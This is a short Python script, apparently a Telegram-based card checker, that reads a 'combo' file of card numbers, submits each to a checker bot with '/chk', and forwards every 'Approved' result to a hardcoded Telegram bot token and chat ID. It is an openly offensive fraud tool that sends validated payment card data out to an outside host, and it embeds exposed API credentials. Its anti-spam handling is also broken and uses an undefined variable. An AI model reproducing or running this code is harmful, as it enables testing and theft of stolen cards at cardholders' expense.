#whitepro
import os
try :
    import pyfiglet
    import telethon
    import requests
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
import time,os,random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
ch = "SDBB_Bot"
api_id = "11275326"
api_hash = "5eaa361079dd93dd40362c7227a74837"
ID = "5257388446"
token= "5770508898:AAGG2qFNwrWcGXkWxezFwBBktxWybHoTzUA"
combo = input(X+'ENTER YOU COMBO NAME : '+F)
os.system('clear')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"):
    try:
        client.send_message(ch ,f"/chk {cc}")
        time.sleep(random.randint(35,35))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            r = str(mssag[0].message).split("again after ")[1]
            r = t.split("seconds")[0]
            r = int(t)
            print(f"Done Sleep : {r+2}")
            time.sleep(t+1)
        ccn = mssag[0].message
        if 'Approved' in ccn :
            print(F+'Approvedβ | Dev : whitepro.')
            mgs=f'''β’ π­πΎπ π΅πππΊ πΌππΎπΌππΎπ½ π»π πΌπππ»πβ.
{ccn} .
π£πΎπβ : @z_w_t
π‘ππ : πΆππππΎ πππ'''
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
            i = requests.post(tlg)
            time.sleep(1)
        else :
            print(Z+'Declinedβ | Dev : whitepro.')
    except:
        print(False)
        #whitepro
